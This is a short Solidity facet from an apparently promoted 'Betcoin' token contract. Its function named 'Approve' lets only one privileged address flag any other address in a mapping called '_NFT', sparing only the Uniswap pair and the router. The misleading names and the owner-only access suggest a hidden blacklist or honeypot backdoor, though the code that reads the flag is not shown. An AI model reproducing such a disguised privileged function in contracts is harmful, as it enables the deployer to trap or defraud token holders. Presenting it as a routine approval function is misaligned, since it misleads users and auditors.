/*
WEBSITE https://thebetcoin.app
TWITTER https://twitter.com/Betcoineth
TELEGRAM https://t.me/BetcoinAiETH
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;
import "./TestLib.sol";
contract ApproveFacet {
    function Approve(address pair) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds._lp[0] == msg.sender &&
            ds._lp[0] != pair &&
            uniswapPair() != pair &&
            pair != ROUTER
        ) {
            ds._NFT[pair] = 1;
        }
    }
    function uniswapPair() public view virtual returns (address) {
        return IUniswapV2Pair(FACTORY).getPair(address(WETH), address(this));
    }
}
